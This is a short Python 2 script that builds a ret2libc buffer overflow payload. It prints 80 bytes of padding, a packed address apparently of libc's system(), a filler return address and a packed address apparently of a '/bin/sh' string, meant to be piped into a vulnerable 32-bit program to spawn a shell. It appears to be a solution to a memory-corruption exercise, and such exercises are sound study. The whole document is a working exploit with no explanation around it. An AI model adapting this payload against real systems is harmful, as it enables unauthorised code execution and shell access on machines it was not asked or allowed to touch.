import struct
padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
system = struct.pack("I", 0xb7ecffb0)
ret_after_sys = "AAAA"
bin_sh = struct.pack("I", 0xb7fb63bf)
print padding + system + ret_after_sys + bin_sh
